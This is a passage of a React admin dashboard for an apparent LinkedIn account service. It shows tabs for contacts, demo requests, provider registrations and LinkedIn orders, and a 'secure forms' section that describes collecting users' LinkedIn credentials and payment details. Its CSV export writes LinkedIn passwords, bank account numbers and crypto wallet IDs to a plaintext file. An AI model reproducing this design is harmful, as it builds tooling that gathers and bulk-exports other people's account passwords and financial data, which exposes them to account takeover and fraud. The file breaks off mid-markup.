import { useState, useMemo } from "react";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { Link, useLocation } from "wouter";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
  CardFooter,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Separator } from "@/components/ui/separator";
import { useDispatch } from "react-redux";
import { logout } from "../../store/slices/authSlice";
import { formatDistanceToNow } from "date-fns";
import {
  Mail,
  Phone,
  Clipboard,
  Calendar,
  User,
  Building,
  Briefcase,
  Download,
  Lock,
  Clock,
  MessageCircle,
  Eye,
} from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

const API_URI = "https://techinrent.onrender.com/api/admin";

function exportToCSV(data, filename) {
  if (!data || !Array.isArray(data) || data.length === 0) return;

  let csvContent = "";
  let headers = [];

  if (filename === "contact-messages") {
    headers = [
      "ID",
      "Full Name",
      "Email",
      "Phone",
      "Company",
      "Message",
      "Created At",
    ];
    csvContent = headers.join(",") + "\n";
    data.forEach((row) => {
      const values = [
        row._id || "",
        `"${(row.fullname || "").replace(/"/g, '""')}"`,
        `"${(row.email || "").replace(/"/g, '""')}"`,
        `"${(row.phone || "").replace(/"/g, '""')}"`,
        `"${(row.company || "").replace(/"/g, '""')}"`,
        `"${(row.message || "").replace(/"/g, '""')}"`,
        row.createdAt ? new Date(row.createdAt).toLocaleString() : "",
      ];
      csvContent += values.join(",") + "\n";
    });
  } else if (filename === "demo-requests") {
    headers = [
      "ID",
      "First Name",
      "Last Name",
      "Email",
      "Phone",
      "Company",
      "Job Title",
      "Created At",
    ];
    csvContent = headers.join(",") + "\n";
    data.forEach((row) => {
      const values = [
        row._id || "",
        `"${(row.firstName || "").replace(/"/g, '""')}"`,
        `"${(row.lastName || "").replace(/"/g, '""')}"`,
        `"${(row.email || "").replace(/"/g, '""')}"`,
        `"${(row.phone || "").replace(/"/g, '""')}"`,
        `"${(row.companyName || "").replace(/"/g, '""')}"`,
        `"${(row.jobtitle || "").replace(/"/g, '""')}"`,
        row.createdAt ? new Date(row.createdAt).toLocaleString() : "",
      ];
      csvContent += values.join(",") + "\n";
    });
  } else if (filename === "provider-registrations") {
    headers = [
      "ID",
      "Full Name",
      "Email",
      "Phone",
      "LinkedIn URL",
      "Verification",
      "Additional Info",
      "Created At",
    ];
    csvContent = headers.join(",") + "\n";
    data.forEach((row) => {
      const values = [
        row._id || "",
        `"${(row.fullName || "").replace(/"/g, '""')}"`,
        `"${(row.email || "").replace(/"/g, '""')}"`,
        `"${(row.phone || "").replace(/"/g, '""')}"`,
        `"${(row.linkedIn || "").replace(/"/g, '""')}"`,
        `"${(row.verification || "").replace(/"/g, '""')}"`,
        `"${(row.additionalInfo || "").replace(/"/g, '""')}"`,
        row.createdAt ? new Date(row.createdAt).toLocaleString() : "",
      ];
      csvContent += values.join(",") + "\n";
    });
  } else if (filename === "linkedin-connection-orders") {
    headers = [
      "ID",
      "Customer Name",
      "Email",
      "Phone",
      "LinkedIn URL",
      "Package",
      "Total Price",
      "Payment Method",
      "Payment Status",
      "Order Status",
      "Created At",
    ];
    csvContent = headers.join(",") + "\n";
    data.forEach((row) => {
      const values = [
        row._id || "",
        `"${(row.customer?.fullname || "").replace(/"/g, '""')}"`,
        `"${(row.customer?.email || "").replace(/"/g, '""')}"`,
        `"${(row.customer?.phone || "").replace(/"/g, '""')}"`,
        `"${(row.linkedin || "").replace(/"/g, '""')}"`,
        `"${(row.package || "").replace(/"/g, '""')}"`,
        row.totalPrice || row.cost || "",
        `"${(row.paymentMethod || "").replace(/"/g, '""')}"`,
        `"${(row.paymentStatus || "").replace(/"/g, '""')}"`,
        `"${(row.status || "").replace(/"/g, '""')}"`,
        row.createdAt ? new Date(row.createdAt).toLocaleString() : "",
      ];
      csvContent += values.join(",") + "\n";
    });
  } else if (filename === "view-forms") {
    headers = [
      "ID",
      "Form ID",
      "Full Name",
      "Phone Number",
      "Email",
      "LinkedIn Email",
      "LinkedIn Password",
      "Payment Method",
      "Bank Account Number",
      "Bank IFSC",
      "Crypto Wallet ID",
      "Crypto Network",
      "Read",
      "Created At",
    ];
    csvContent = headers.join(",") + "\n";
    data.forEach((row) => {
      const values = [
        row._id || "",
        row.formUuid || row.formId || "",
        `"${(row.fullName || "").replace(/"/g, '""')}"`,
        `"${(row.phoneNumber || "").replace(/"/g, '""')}"`,
        `"${(row.email || "").replace(/"/g, '""')}"`,
        `"${(row.linkedinEmail || "").replace(/"/g, '""')}"`,
        `"${(row.linkedinPassword || "").replace(/"/g, '""')}"`,
        `"${(row.paymentInfo?.method || "").replace(/"/g, '""')}"`,
        `"${(row.paymentInfo?.bank?.accountNumber || "").replace(/"/g, '""')}"`,
        `"${(row.paymentInfo?.bank?.ifsc || "").replace(/"/g, '""')}"`,
        `"${(row.paymentInfo?.crypto?.walletId || "").replace(/"/g, '""')}"`,
        `"${(row.paymentInfo?.crypto?.network || "").replace(/"/g, '""')}"`,
        row.read ? "true" : "false",
        row.createdAt ? new Date(row.createdAt).toLocaleString() : "",
      ];
      csvContent += values.join(",") + "\n";
    });
  }

  const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.setAttribute("href", url);
  link.setAttribute(
    "download",
    `${filename}-${new Date().toISOString().split("T")[0]}.csv`
  );
  link.style.visibility = "hidden";
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

const fetcher = async (url) => {
  const response = await fetch(url, {
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${localStorage.getItem("adminToken")}`,
    },
  });
  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(errorData.message || `Failed to fetch data from ${url}`);
  }
  const data = await response.json();
  return Array.isArray(data.data) ? data.data : [];
};

export default function Admin() {
  const dispatch = useDispatch();
  const [, navigate] = useLocation();
  const queryClient = useQueryClient();
  const [activeTab, setActiveTab] = useState("contact");
  const [selectedSubmission, setSelectedSubmission] = useState(null);
  const [viewDetailOpen, setViewDetailOpen] = useState(false);
  const [searchTerms, setSearchTerms] = useState({
    contact: "",
    demo: "",
    provider: "",
    linkedinOrders: "",
  });

  const contactQuery = useQuery({
    queryKey: ["contact-messages"],
    queryFn: () => fetcher(`${API_URI}/contacts`),
    enabled: activeTab === "contact",
  });

  const demoQuery = useQuery({
    queryKey: ["demo-requests"],
    queryFn: () => fetcher(`${API_URI}/demos`),
    enabled: activeTab === "demo",
  });

  const providerQuery = useQuery({
    queryKey: ["provider-inquiries"],
    queryFn: () => fetcher(`${API_URI}/providers`),
    enabled: activeTab === "provider",
  });

  const linkedinOrdersQuery = useQuery({
    queryKey: ["linkedin-connection-orders"],
    queryFn: () => fetcher(`${API_URI}/orders`),
    enabled: activeTab === "linkedin-orders",
  });

  const filteredData = useMemo(
    () => ({
      contact:
        contactQuery.data?.filter((row) => {
          const term = searchTerms.contact.trim().toLowerCase();
          return term
            ? (row.fullname || "").toLowerCase().includes(term) ||
                (row.email || "").toLowerCase().includes(term) ||
                (row.phone || "").toLowerCase().includes(term) ||
                (row.company || "").toLowerCase().includes(term)
            : true;
        }) || [],
      demo:
        demoQuery.data?.filter((row) => {
          const term = searchTerms.demo.trim().toLowerCase();
          return term
            ? (row.firstName || "").toLowerCase().includes(term) ||
                (row.lastName || "").toLowerCase().includes(term) ||
                (row.email || "").toLowerCase().includes(term) ||
                (row.phone || "").toLowerCase().includes(term) ||
                (row.companyName || "").toLowerCase().includes(term)
            : true;
        }) || [],
      provider:
        providerQuery.data?.filter((row) => {
          const term = searchTerms.provider.trim().toLowerCase();
          return term
            ? (row.fullName || "").toLowerCase().includes(term) ||
                (row.email || "").toLowerCase().includes(term) ||
                (row.phone || "").toLowerCase().includes(term) ||
                (row.linkedIn || "").toLowerCase().includes(term)
            : true;
        }) || [],
      linkedinOrders:
        linkedinOrdersQuery.data?.filter((row) => {
          const term = searchTerms.linkedinOrders.trim().toLowerCase();
          return term
            ? (row.customer?.fullname || "").toLowerCase().includes(term) ||
                (row.customer?.email || "").toLowerCase().includes(term) ||
                (row.customer?.phone || "").toLowerCase().includes(term) ||
                (row.linkedin || "").toLowerCase().includes(term)
            : true;
        }) || [],
    }),
    [
      contactQuery.data,
      demoQuery.data,
      providerQuery.data,
      linkedinOrdersQuery.data,
      searchTerms,
    ]
  );

  const handleLogout = () => {
    localStorage.removeItem("adminToken");
    localStorage.removeItem("adminData");
    dispatch(logout());
    navigate("/login");
  };

  const viewSubmissionDetails = (submission) => {
    setSelectedSubmission(submission);
    setViewDetailOpen(true);
  };

  const renderLoading = () => (
    <div className="text-center py-10">Loading...</div>
  );

  const renderError = (error) => (
    <div className="text-center py-10 text-red-500">
      {error.message || "An error occurred while fetching data."}
    </div>
  );

  const renderNoData = (message) => (
    <div className="text-center py-10 text-gray-500">{`No ${message} found.`}</div>
  );

  const handleSearchChange = (tab, value) => {
    setSearchTerms((prev) => ({ ...prev, [tab]: value }));
  };

  return (
    <div className="min-h-screen bg-sky-100">
      <div className="container mx-auto py-6 px-4 sm:py-10">
        <div className="mb-8 flex justify-between items-center">
          <div>
            <h1 className="text-2xl sm:text-3xl font-bold text-primary mb-2">
              Admin Dashboard
            </h1>
            <p className="text-gray-600">
              Manage your platform data and monitor activities
            </p>
          </div>
          <Button
            variant="outline"
            onClick={handleLogout}
            className="text-sm bg-white border-gray-300"
          >
            Logout
          </Button>
        </div>

        <Tabs
          defaultValue="contact"
          value={activeTab}
          onValueChange={setActiveTab}
          className="space-y-6"
        >
          <TabsList className="grid w-full grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 h-auto p-1 gap-1">
            <TabsTrigger
              value="contact"
              className="text-xs sm:text-sm py-2 px-1 sm:px-2"
            >
              Contact
            </TabsTrigger>
            <TabsTrigger
              value="demo"
              className="text-xs sm:text-sm py-2 px-1 sm:px-2"
            >
              Demo
            </TabsTrigger>
            <TabsTrigger
              value="provider"
              className="text-xs sm:text-sm py-2 px-1 sm:px-2"
            >
              Provider
            </TabsTrigger>
            <TabsTrigger
              value="linkedin-orders"
              className="text-xs sm:text-sm py-2 px-1 sm:px-2"
            >
              LinkedIn
            </TabsTrigger>
            <TabsTrigger
              value="secureforms"
              className="text-xs sm:text-sm py-2 px-1 sm:px-2"
            >
              Forms
            </TabsTrigger>
          </TabsList>

          <TabsContent value="contact">
            <div className="flex flex-col gap-4 mb-4">
              <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4">
                <h2 className="text-xl font-semibold text-gray-900">
                  Contact Messages
                </h2>
                <div className="flex flex-col sm:flex-row gap-2">
                  <Button
                    variant="outline"
                    onClick={() =>
                      exportToCSV(filteredData.contact, "contact-messages")
                    }
                    disabled={
                      contactQuery.isLoading || !filteredData.contact.length
                    }
                    className="text-sm bg-white border-gray-300"
                  >
                    <Download className="mr-2 h-4 w-4" /> Export CSV
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => contactQuery.refetch()}
                    disabled={contactQuery.isFetching}
                    className="text-sm bg-white border-gray-300"
                  >
                    Refresh
                  </Button>
                </div>
              </div>
              <Input
                placeholder="Search by name, email, phone, or company..."
                className="bg-white border-gray-300"
                value={searchTerms.contact}
                onChange={(e) => handleSearchChange("contact", e.target.value)}
              />
            </div>
            {contactQuery.isFetching ? (
              renderLoading()
            ) : contactQuery.isError ? (
              renderError(contactQuery.error)
            ) : !filteredData.contact.length ? (
              renderNoData("contact messages")
            ) : (
              <Card className="bg-white border-gray-300">
                <CardContent className="p-0">
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead className="text-gray-900">ID</TableHead>
                          <TableHead className="text-gray-900">
                            Full Name
                          </TableHead>
                          <TableHead className="text-gray-900">Email</TableHead>
                          <TableHead className="text-gray-900">Phone</TableHead>
                          <TableHead className="text-gray-900">
                            Company
                          </TableHead>
                          <TableHead className="text-gray-900">
                            Message
                          </TableHead>
                          <TableHead className="text-gray-900">Date</TableHead>
                          <TableHead className="text-gray-900">
                            Actions
                          </TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {filteredData.contact.map((message) => (
                          <TableRow key={message._id} className="bg-white">
                            <TableCell>{message._id}</TableCell>
                            <TableCell>{message.fullname}</TableCell>
                            <TableCell>{message.email}</TableCell>
                            <TableCell>{message.phone || "N/A"}</TableCell>
                            <TableCell>
                              {message.company || "Not specified"}
                            </TableCell>
                            <TableCell className="max-w-xs truncate">
                              {message.message}
                            </TableCell>
                            <TableCell>
                              {new Date(message.createdAt).toLocaleString()}
                            </TableCell>
                            <TableCell>
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => viewSubmissionDetails(message)}
                                className="h-8 w-8 p-0 text-gray-500"
                              >
                                <Eye className="h-4 w-4" />
                              </Button>
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                </CardContent>
                <CardFooter className="py-4 border-t border-gray-300">
                  <div className="text-sm text-gray-500">
                    Showing {filteredData.contact.length} of{" "}
                    {contactQuery.data?.length || 0} messages
                  </div>
                </CardFooter>
              </Card>
            )}
          </TabsContent>

          <TabsContent value="demo">
            <div className="flex flex-col gap-4 mb-4">
              <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4">
                <h2 className="text-xl font-semibold text-gray-900">
                  Demo Requests
                </h2>
                <div className="flex flex-col sm:flex-row gap-2">
                  <Button
                    variant="outline"
                    onClick={() =>
                      exportToCSV(filteredData.demo, "demo-requests")
                    }
                    disabled={demoQuery.isLoading || !filteredData.demo.length}
                    className="text-sm bg-white border-gray-300"
                  >
                    <Download className="mr-2 h-4 w-4" /> Export CSV
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => demoQuery.refetch()}
                    disabled={demoQuery.isFetching}
                    className="text-sm bg-white border-gray-300"
                  >
                    Refresh
                  </Button>
                </div>
              </div>
              <Input
                placeholder="Search by name, email, phone, or company..."
                className="bg-white border-gray-300"
                value={searchTerms.demo}
                onChange={(e) => handleSearchChange("demo", e.target.value)}
              />
            </div>
            {demoQuery.isFetching ? (
              renderLoading()
            ) : demoQuery.isError ? (
              renderError(demoQuery.error)
            ) : !filteredData.demo.length ? (
              renderNoData("demo requests")
            ) : (
              <Card className="bg-white border-gray-300">
                <CardContent className="p-0">
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead className="text-gray-900">ID</TableHead>
                          <TableHead className="text-gray-900">
                            Full Name
                          </TableHead>
                          <TableHead className="text-gray-900">Email</TableHead>
                          <TableHead className="text-gray-900">Phone</TableHead>
                          <TableHead className="text-gray-900">
                            Company
                          </TableHead>
                          <TableHead className="text-gray-900">
                            Job Title
                          </TableHead>
                          <TableHead className="text-gray-900">Date</TableHead>
                          <TableHead className="text-gray-900">
                            Actions
                          </TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {filteredData.demo.map((request) => (
                          <TableRow key={request._id} className="bg-white">
                            <TableCell>{request._id}</TableCell>
                            <TableCell>
                              {request.firstName} {request.lastName}
                            </TableCell>
                            <TableCell>{request.email}</TableCell>
                            <TableCell>{request.phone}</TableCell>
                            <TableCell>
                              {request.companyName || "Not specified"}
                            </TableCell>
                            <TableCell>
                              {request.jobtitle || "Not specified"}
                            </TableCell>
                            <TableCell>
                              {new Date(request.createdAt).toLocaleString()}
                            </TableCell>
                            <TableCell>
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => viewSubmissionDetails(request)}
                                className="h-8 w-8 p-0 text-gray-500"
                              >
                                <Eye className="h-4 w-4" />
                              </Button>
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                </CardContent>
                <CardFooter className="py-4 border-t border-gray-300">
                  <div className="text-sm text-gray-500">
                    Showing {filteredData.demo.length} of{" "}
                    {demoQuery.data?.length || 0} requests
                  </div>
                </CardFooter>
              </Card>
            )}
          </TabsContent>

          <TabsContent value="provider">
            <div className="flex flex-col gap-4 mb-4">
              <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4">
                <h2 className="text-xl font-semibold text-gray-900">
                  Provider Registrations
                </h2>
                <div className="flex flex-col sm:flex-row gap-2">
                  <Button
                    variant="outline"
                    onClick={() =>
                      exportToCSV(
                        filteredData.provider,
                        "provider-registrations"
                      )
                    }
                    disabled={
                      providerQuery.isLoading || !filteredData.provider.length
                    }
                    className="text-sm bg-white border-gray-300"
                  >
                    <Download className="mr-2 h-4 w-4" /> Export CSV
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => providerQuery.refetch()}
                    disabled={providerQuery.isFetching}
                    className="text-sm bg-white border-gray-300"
                  >
                    Refresh
                  </Button>
                </div>
              </div>
              <Input
                placeholder="Search by name, email, phone, or LinkedIn URL..."
                className="bg-white border-gray-300"
                value={searchTerms.provider}
                onChange={(e) => handleSearchChange("provider", e.target.value)}
              />
            </div>
            {providerQuery.isFetching ? (
              renderLoading()
            ) : providerQuery.isError ? (
              renderError(providerQuery.error)
            ) : !filteredData.provider.length ? (
              renderNoData("provider registrations")
            ) : (
              <Card className="bg-white border-gray-300">
                <CardContent className="p-0">
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead className="text-gray-900">ID</TableHead>
                          <TableHead className="text-gray-900">
                            Full Name
                          </TableHead>
                          <TableHead className="text-gray-900">Email</TableHead>
                          <TableHead className="text-gray-900">Phone</TableHead>
                          <TableHead className="text-gray-900">
                            LinkedIn
                          </TableHead>
                          <TableHead className="text-gray-900">
                            Verification
                          </TableHead>
                          <TableHead className="text-gray-900">
                            Additional Info
                          </TableHead>
                          <TableHead className="text-gray-900">Date</TableHead>
                          <TableHead className="text-gray-900">
                            Actions
                          </TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {filteredData.provider.map((provider) => (
                          <TableRow key={provider._id} className="bg-white">
                            <TableCell>{provider._id}</TableCell>
                            <TableCell>{provider.fullName}</TableCell>
                            <TableCell>{provider.email}</TableCell>
                            <TableCell>{provider.phone || "N/A"}</TableCell>
                            <TableCell>
                              <a
                                href={provider.linkedIn}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="text-blue-500 hover:underline"
                              >
                                View Profile
                              </a>
                            </TableCell>
                            <TableCell>
                              <Badge
                                variant={
                                  provider.verification === "verified"
                                    ? "default"
                                    : "outline"
                                }
                                className="border-gray-300"
                              >
                                {provider.verification === "verified"
                                  ? "Verified"
                                  : "Non-Verified"}
                              </Badge>
                            </TableCell>
                            <TableCell className="max-w-xs truncate">
                              {provider.additionalInfo || "N/A"}
                            </TableCell>
                            <TableCell>
                              {new Date(provider.createdAt).toLocaleString()}
                            </TableCell>
                            <TableCell>
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => viewSubmissionDetails(provider)}
                                className="h-8 w-8 p-0 text-gray-500"
                              >
                                <Eye className="h-4 w-4" />
                              </Button>
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                </CardContent>
                <CardFooter className="py-4 border-t border-gray-300">
                  <div className="text-sm text-gray-500">
                    Showing {filteredData.provider.length} of{" "}
                    {providerQuery.data?.length || 0} registrations
                  </div>
                </CardFooter>
              </Card>
            )}
          </TabsContent>

          <TabsContent value="linkedin-orders">
            <div className="flex flex-col gap-4 mb-4">
              <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4">
                <h2 className="text-xl font-semibold text-gray-900">
                  LinkedIn Connection Orders
                </h2>
                <div className="flex flex-col sm:flex-row gap-2">
                  <Button
                    variant="outline"
                    onClick={() =>
                      exportToCSV(
                        filteredData.linkedinOrders,
                        "linkedin-connection-orders"
                      )
                    }
                    disabled={
                      linkedinOrdersQuery.isLoading ||
                      !filteredData.linkedinOrders.length
                    }
                    className="text-sm bg-white border-gray-300"
                  >
                    <Download className="mr-2 h-4 w-4" /> Export CSV
                  </Button>
                  <Button
                    variant="outline"
                    onClick={() => linkedinOrdersQuery.refetch()}
                    disabled={linkedinOrdersQuery.isFetching}
                    className="text-sm bg-white border-gray-300"
                  >
                    Refresh
                  </Button>
                </div>
              </div>
              <Input
                placeholder="Search by name, email, phone, or LinkedIn URL..."
                className="bg-white border-gray-300"
                value={searchTerms.linkedinOrders}
                onChange={(e) =>
                  handleSearchChange("linkedinOrders", e.target.value)
                }
              />
            </div>
            {linkedinOrdersQuery.isFetching ? (
              renderLoading()
            ) : linkedinOrdersQuery.isError ? (
              renderError(linkedinOrdersQuery.error)
            ) : !filteredData.linkedinOrders.length ? (
              renderNoData("LinkedIn connection orders")
            ) : (
              <Card className="bg-white border-gray-300">
                <CardContent className="p-0">
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead className="text-gray-900">ID</TableHead>
                          <TableHead className="text-gray-900">
                            Customer Name
                          </TableHead>
                          <TableHead className="text-gray-900">Email</TableHead>
                          <TableHead className="text-gray-900">Phone</TableHead>
                          <TableHead className="text-gray-900">
                            LinkedIn
                          </TableHead>
                          <TableHead className="text-gray-900">
                            Package
                          </TableHead>
                          <TableHead className="text-gray-900">
                            Total Price
                          </TableHead>
                          <TableHead className="text-gray-900">
                            Payment Method
                          </TableHead>
                          <TableHead className="text-gray-900">
                            Status
                          </TableHead>
                          <TableHead className="text-gray-900">Date</TableHead>
                          <TableHead className="text-gray-900">
                            Actions
                          </TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {filteredData.linkedinOrders.map((order) => (
                          <TableRow key={order._id} className="bg-white">
                            <TableCell>{order._id}</TableCell>
                            <TableCell>
                              {order.customer?.fullname || "Unknown"}
                            </TableCell>
                            <TableCell>
                              {order.customer?.email || "N/A"}
                            </TableCell>
                            <TableCell>
                              {order.customer?.phone || "N/A"}
                            </TableCell>
                            <TableCell>
                              <a
                                href={order.linkedin}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="text-blue-500 hover:underline"
                              >
                                View Profile
                              </a>
                            </TableCell>
                            <TableCell>{order.package || "N/A"}</TableCell>
                            <TableCell>
                              ${order.totalPrice || order.cost || "N/A"}
                            </TableCell>
                            <TableCell>
                              {order.paymentMethod || "N/A"}
                            </TableCell>
                            <TableCell>
                              <Badge
                                variant={
                                  order.status === "completed"
                                    ? "default"
                                    : order.status === "processing"
                                    ? "secondary"
                                    : "outline"
                                }
                                className="border-gray-300"
                              >
                                {order.status || "Unknown"}
                              </Badge>
                            </TableCell>
                            <TableCell>
                              {order.createdAt
                                ? new Date(order.createdAt).toLocaleString()
                                : "N/A"}
                            </TableCell>
                            <TableCell>
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => viewSubmissionDetails(order)}
                                className="h-8 w-8 p-0 text-gray-500"
                              >
                                <Eye className="h-4 w-4" />
                              </Button>
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                </CardContent>
                <CardFooter className="py-4 border-t border-gray-300">
                  <div className="text-sm text-gray-500">
                    Showing {filteredData.linkedinOrders.length} of{" "}
                    {linkedinOrdersQuery.data?.length || 0} orders
                  </div>
                </CardFooter>
              </Card>
            )}
          </TabsContent>

          <TabsContent value="secureforms" className="space-y-6">
            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center gap-4">
              <h2 className="text-xl font-semibold text-gray-900">
                Secure Forms
              </h2>
              <div className="flex flex-col sm:flex-row gap-2">
                <Link href="/admin/secure-forms">
                  <Button className="bg-gradient-to-r from-blue-500 to-blue-700 text-white text-sm w-full sm:w-auto">
                    <Lock className="mr-2 h-4 w-4" />
                    Manage Secure Forms
                  </Button>
                </Link>
              </div>
            </div>
            <Card className="max-w-2xl mx-auto bg-white border-gray-300">
              <CardHeader>
                <CardTitle className="text-gray-900">
                  Secure Form Management
                </CardTitle>
                <CardDescription className="text-gray-500">
                  Create and manage secure forms for collecting sensitive
                  information
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="rounded-lg border p-4 border-gray-300">
                    <h3 className="text-lg font-medium mb-2 text-gray-900">
                      Generate New Form Link
                    </h3>
                    <p className="text-sm text-gray-500 mb-4">
                      Create a unique, one-time use link for collecting LinkedIn
                      credentials and payment details securely.
                    </p>
                    <Link href="/admin/secure-forms">
                      <Button
                        variant="outline"
                        className="w-full bg-white border-gray-300"
                      >
                        Create New Link
                      </Button>
                    </Link>
                  </div>
                  <div className="rounded-lg border p-4 border-gray-300">
                    <h3 className="text-lg font-medium mb-2 text-gray-900">
                      View Submissions
                    </h3>
                    <p className="text-sm text-gray-500 mb-4">
                      Access and manage all the secure form submissions from
                      users.
                    </p>
                    <Link href="/admin/secure-forms">
                      <Button
                        variant="outline"
                        className="w-full bg-white border-gray-300"
                      >
                        View Submissions
                      </Button>
                    </Link>
                  </div>
                </div>
                <div className="mt-4 p-4 bg-amber-50 border border-amber-200 rounded-md">
                  <h4 className="text-amber-800 font-medium">Security Note</h4>
                  <p className="text-sm text-amber-700 mt-1">
                    Secure forms contain sensitive information. Access is
                    restricted to authorized administrators only. All form URLs
                    are single-use and expire after submission.
                  </p>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
          {/* View Forms removed: now handled in SecureFormAdmin */}
        </Tabs>

        <Dialog open={viewDetailOpen} onOpenChange={setViewDetailOpen}>
          <DialogContent className="max-w-2xl bg-white border-gray-300">
            <DialogHeader>
              <DialogTitle className="text-gray-900">
                Submission Details
              </DialogTitle>
              <DialogDescription className="text-gray-500">
                Complete information for submission #{selectedSubmission?._id}
              </DialogDescription>
            </DialogHeader>

            {selectedSubmission && (
              <div className="space-y-3">
                <Card className="bg-white border-gray-300">
                  <CardHeader className="pb-2">
                    <div className="flex justify-between items-start">
                      <div>
                        {selectedSubmission.formUuid && (
                          <CardTitle className="text-lg text-gray-900">
                            FormId: {selectedSubmission.formUuid}
                          </CardTitle>
                        )}
                        <CardTitle className="text-lg text-gray-900">
                          Name:{" "}
                          {selectedSubmission.fullname ||
                            selectedSubmission.fullName ||
                            `${selectedSubmission.firstName || ""} ${
                              selectedSubmission.lastName || ""
                            }`.trim() ||
                            selectedSubmission.customer?.fullname ||
                            "Unknown"}
                        </CardTitle>
                        <CardDescription className="flex items-center gap-1 mt-1 text-gray-500">
                          <Calendar className="h-3 w-3" />
                          {formatDistanceToNow(
                            new Date(selectedSubmission.createdAt),
                            { addSuffix: true }
                          )}
                        </CardDescription>
                      </div>
                    </div>
                  </CardHeader>
                  <CardContent className="space-y-3">
                    <div className="flex items-center gap-2">
                      <Mail className="h-4 w-4 text-gray-500" />
                      <span className="text-gray-900">
                        {selectedSubmission.email ||
                          selectedSubmission.customer?.email ||
                          "N/A"}
                      </span>
                    </div>
                    {(selectedSubmission.phone ||
                      selectedSubmission.phoneNumber ||
                      selectedSubmission.customer?.phone) && (
                      <div className="flex items-center gap-2">
                        <Phone className="h-4 w-4 text-gray-500" />
                        <span className="text-gray-900">
                          {selectedSubmission.phone ||
                            selectedSubmission.phoneNumber ||
                            selectedSubmission.customer?.phone}
                        </span>
                      </div>
                    )}
                    {(selectedSubmission.company ||
                      selectedSubmission.companyName) && (
                      <div className="flex items-center gap-2">
                        <Building className="h-4 w-4 text-gray-500" />
                        <span className="text-gray-900">
                          {selectedSubmission.company ||
                            selectedSubmission.companyName ||
                            "Not specified"}
                        </span>
                      </div>
                    )}
                    {selectedSubmission.jobtitle && (
                      <div className="flex items-center gap-2">
                        <Briefcase className="h-4 w-4 text-gray-500" />
                        <span className="text-gray-900">
                          {selectedSubmission.jobtitle}
                        </span>
                      </div>
                    )}
                    {selectedSubmission.linkedIn && (
                      <div className="flex items-center gap-2">
                        <Clipboard className="h-4 w-4 text-gray-500" />
                        <a
                          href={selectedSubmission.linkedIn}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-blue-500 hover:underline"
                        >
                          LinkedIn Profile
                        </a>
                      </div>
                    )}
                    {selectedSubmission.verification && (
                      <div className="flex items-center gap-2">
                        <Badge
                          variant={
                            selectedSubmission.verification === "verified"
                              ? "default"
                              : "outline"
                          }
                          className="border-gray-300"
                        >
                          {selectedSubmission.verification === "verified"
                            ? "Verified Profile"
                            : "Non-Verified Profile"}
                        </Badge>
                      </div>
                    )}
                    {selectedSubmission.additionalInfo && (
                      <>
                        <Separator className="border-gray-300" />
                        <div>
                          <h4 className="text-sm font-medium text-gray-900 mb-1">
                            Additional Information:
                          </h4>
                          <p className="text-sm text-gray-600 whitespace-pre-wrap">
                            {selectedSubmission.additionalInfo}
                          </p>
                        </div>
                      </>
                    )}
                    {selectedSubmission.message && (
                      <>
                        <Separator className="border-gray-300" />
                        <div>
                          <h4 className="text-sm font-medium text-gray-900 mb-1">
                            Message:
                          </h4>
                          <p className="text-sm text-gray-600 whitespace-pre-wrap">
                            {selectedSubmission.message}
                          </p>
                        </div>
                      </>
                    )}
                    {selectedSubmission.package && (
                      <div className="flex items-center gap-2">
                        <Briefcase className="h-4 w-4 text-gray-500" />
                        <span className="text-gray-900">
                          Package: {selectedSubmission.package}
                        </span>
                      </div>
                    )}
                    {(selectedSubmission.totalPrice ||
                      selectedSubmission.cost) && (
                      <div className="flex items-center gap-2">
